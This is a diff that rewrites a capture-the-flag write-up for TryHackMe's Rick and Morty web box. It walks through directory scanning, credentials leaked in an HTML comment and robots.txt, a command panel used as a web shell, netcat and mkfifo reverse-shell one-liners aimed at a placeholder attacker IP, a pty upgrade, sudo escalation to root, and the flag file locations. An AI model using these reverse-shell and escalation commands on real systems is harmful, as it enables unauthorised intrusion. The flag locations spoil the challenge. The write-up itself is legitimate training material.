@@ -53,97 +53,92 @@
     
             <section id="introduction">
                 <h2>Introduction</h2>
-                <p>A Rick and Morty CTF. Help turn Rick back into a human!</p>
+                <p>Web exploitation CTF on TryHackMe, themed around the Rick and Morty cartoon.</p>
             </section>
             
             <section id="objective">
                 <h2>Objective</h2>
-                <p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.</p>
+                <p>Exploit a web server and recover three flags hidden across user contexts on the box.</p>
             </section>
             
             <section id="setup">
                 <h2>Setup</h2>
-                <p>Either use the AttackBox or do it properly and use the VPN.</p>
+                <p>Connect via the TryHackMe VPN.</p>
             </section>
             
             <section id="One">
                 <h2>Step One - Inspect the Source</h2>
-                <p>Inspect the elements of the landing page. You will see that there is a comment with the username "R1ckRul3s". Write this down!</p>
-                <img src="/writeups/img/found_username.png" alt="/writeups/img/not_found.png">
+                <p>View the source of the landing page. An HTML comment exposes the username "R1ckRul3s".</p>
+                <img src="/writeups/img/found_username.png" alt="HTML comment exposing the R1ckRul3s username">
             </section>
 
             <section id="Two">
                 <h2>Step Two - Enumeration</h2>
-                <p>Enumerate the websites directories...</p>
-                <pre><code>case@local:~$ gobuster dir -u http://10.10.236.162 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 64 -o rickCtfDirScan.txt 2>/dev/null</code></pre>
-                <p>Let us also run a basic Nikto scan, as this will retrieve the headers advertised by the webserver and will look for any sensitive files also...</p>
-                <pre><code>case@local:~$ nikto -h http://10.10.236.162 -o rickCtfNiktoScan.txt</code></pre>
-                <p>There is quite a lot that could be interesting to us in both of the scan output files. Firstly, there is a "robots.txt" file, identified by the gobuster scan. Typically this file is used by websites to give instructions to web crawlers. However, it might provide detail as to hidden directories or files, or even give clues to sensitive information. Let us see if we can request it directly in the URL...</p>
-                <img src="/writeups/img/robots_file.png" alt="/writeups/img/not_found.png">
-                <p>We can! This is non-standard content for the "robots.txt" file. Write this down! Is this the password for the username we found in step one?</p>
-                <p>The contents of the nikto scan output file has this line "+ GET /login.php: Admin login page/section found.". Let us see if we can request that page, and if so, enter what we now believe to be valid credentials. What do you know, it worked, we are now logged in...</p>
-                <img src="/writeups/img/pickle_landing.png" alt="/writeups/img/not_found.png">
+                <p>Run gobuster against the web root for directory and file discovery:</p>
+                <pre><code>$ gobuster dir -u http://10.10.236.162 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 64 -o rickCtfDirScan.txt 2>/dev/null</code></pre>
+                <p>Run Nikto for headers and sensitive file detection:</p>
+                <pre><code>$ nikto -h http://10.10.236.162 -o rickCtfNiktoScan.txt</code></pre>
+                <p>Gobuster identifies a "robots.txt" file. Standard use of "robots.txt" is to give crawler directives, but here the contents are non-standard:</p>
+                <img src="/writeups/img/robots_file.png" alt="Contents of robots.txt showing what appears to be a password">
+                <p>This appears to be a password — paired with the "R1ckRul3s" username from Step One, this is a credential pair to test.</p>
+                <p>Nikto identifies "/login.php" as an admin login page. Submitting the credential pair authenticates successfully:</p>
+                <img src="/writeups/img/pickle_landing.png" alt="Authenticated session showing the Command Panel form">
             </section>
 
             <section id="Three">
                 <h2>Step Three - A Reverse Shell</h2>
-                <p>We now have an active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
-                <img src="/writeups/img/pickle_form.png" alt="/writeups/img/not_found.png">
-                <p>We effectively have a web shell. "whoami" is showing we are currently logged in as "www-data". This is good. However, "www-data" is commonly the user created when the web server software is installed and therefore is, typically, a low-privileged user created specifically for running web server processes. I wonder if we can submit the form with a command to open a network connection and execute a shell? Let us try with netcat. First we need a listener on our local/attacking machine.. </p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
-                <p>Now submit the command..</p>
+                <p>The post-login page presents a "Command Panel" form input. Submit "whoami":</p>
+                <img src="/writeups/img/pickle_form.png" alt="Command Panel form returning whoami output">
+                <p>This is a web shell running as "www-data" — the standard low-privilege user for web server processes. Convert it into a reverse shell.</p>
+                <p>Start a listener locally:</p>
+                <pre><code>$ sudo nc -lvnp 444</code></pre>
+                <p>First attempt — direct netcat with "-e":</p>
                 <pre><code>nc attacking_ip_address 444 -e /bin/bash</code></pre>
-                <p>It did not work....</p>
-                <img src="/writeups/img/sad_morty.jpeg" alt="/writeups/img/not_found.png">
-                <p>Maybe it just does not like the attempt to execute the shell; in many systems, especially on newer versions of netcat (like netcat-openbsd), the -e option (which allows execution of commands) is disabled by default due to security concerns, as it can be used for malicious purposes (like reverse shells!!). So let us see if we can simply submit the command...</p>
+                <p>No connection. Modern netcat builds (notably "netcat-openbsd") compile out the "-e" option by default — direct command execution flags are a primary reverse-shell vector and have been removed from default builds for that reason.</p>
+                <p>Confirm netcat itself can still reach the listener (without "-e"):</p>
                 <pre><code>nc attacking_ip_address 444</code></pre>
-                <p>It worked!!</p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444
-[sudo] password for case:
+                <pre><code>$ sudo nc -lvnp 444
 Listening on 0.0.0.0 444
 Connection received on 10.10.236.162 37146
                 </code></pre>
-                <p>Okay, so we can successfully execute a netcat command but we cannot use the "-e" option, which allows us to execute an external program after making the connection. Well, let's just do it manually instead, by creating a named pipe and redirecting stdin, stdout and stderr...</p>
+                <p>Connection established. Replace the bare connection with a reverse shell using a named pipe to redirect stdin, stdout, and stderr through netcat:</p>
                 <pre><code>mkfifo /tmp/f; nc attacking_ip_address 444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f</code></pre>
-                <p>We now have a reverse shell..</p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444
-[sudo] password for case:
+                <pre><code>$ sudo nc -lvnp 444
 Listening on 0.0.0.0 444
 Connection received on 10.10.236.162 37260
 whoami
 www-data
                 </code></pre>
-                <p>This is a bit clunky however, it doesn't give us a fully-fledged terminal environment. Let us see if we can spawn a pseudo-terminal using Python, to more accurately simulate a real terminal session; we know we are on a Linux box, Python3 is likely installed, let us give it a go...</p>
+                <p>The shell works but lacks job control and proper terminal behaviour. Upgrade to a pseudo-terminal via Python — "python3" is generally available on Linux targets:</p>
                 <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
-                <p>It worked a treat...</p>
                 <pre><code>www-data@ip-10-10-236-162:/var/www/html$</code></pre>
-                <p>Let us set the TERM environment variable also, let us set it to "xterm", this will ensure our pseudo terminal behaves correctly, and ensures compatibility with features such as screen clearing..</p>
+                <p>Set "TERM" to handle screen clearing and other terminal escape sequences:</p>
                 <pre><code>export TERM=xterm</code></pre>
             </section>
 
             <section id="Four">
                 <h2>Step Four - Privilege Escalation</h2>
-                <p>Okay, so we have a stable/interactive reverse shell. We still only have "www-data" privileges. Let see what this user can do with "sudo". Using the command "sudo -l" we get the following output:</p>
+                <p>Check sudo permissions for "www-data":</p>
                 <pre><code>User www-data may run the following commands on ip-10-10-236-162:
     (ALL) NOPASSWD: ALL
                 </code></pre>
-                <p>This is now effectively game over. This is telling us that our current logged in user can execute commands as any user, that no password is required to do so, and that we can run any command. We can simply escalate to root now by executing "sudo /bin/bash". We are now root!</p>
+                <p>"(ALL) NOPASSWD: ALL" — this user can run any command as any user without a password. Escalate to root with "sudo /bin/bash":</p>
                 <pre><code>root@ip-10-10-236-162:/var/www/html#</code></pre>
             </section>
             
             <section id="solution">
                 <h2>Solution</h2>
-                <p>First flag is here:</p>
+                <p>First flag:</p>
                 <pre><code>root@ip-10-10-236-162:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt</code></pre>
-                <p>The second flag is here:</p>
+                <p>Second flag:</p>
                 <pre><code>root@ip-10-10-236-162:/home/rick# cat 'second ingredients'</code></pre>
-                <p>The final flag I found in this file here:</p>
+                <p>Third flag — from ".bash_history" of the "ubuntu" user:</p>
                 <pre><code>root@ip-10-10-236-162:/home/ubuntu# nano .bash_history</code></pre>
             </section>
             
             <section id="conclusion">
                 <h2>Conclusion</h2>
-                <p>This was fairly straight forward and should not give you any trouble. It is the first CTF in the Complete Beginner path so although it was fairly easy it was very useful in applying the techniques taught in the path up to this point. The key is to enumerate thoroughly first, carefully consider what you know about your target and tailor your attack based on what you know.</p>
+                <p>Standard initial-foothold-to-root chain on a deliberately misconfigured web app: HTML source comment exposes the username, "robots.txt" exposes the password, an authenticated form provides command execution, and "(ALL) NOPASSWD: ALL" in sudoers gives root in one step. Useful as a baseline reminder that thorough enumeration of obvious surfaces — HTML source, "robots.txt", post-auth functionality, "sudo -l" — often outperforms clever exploitation when working initial foothold.</p>
             </section>
         </article>
     </main>
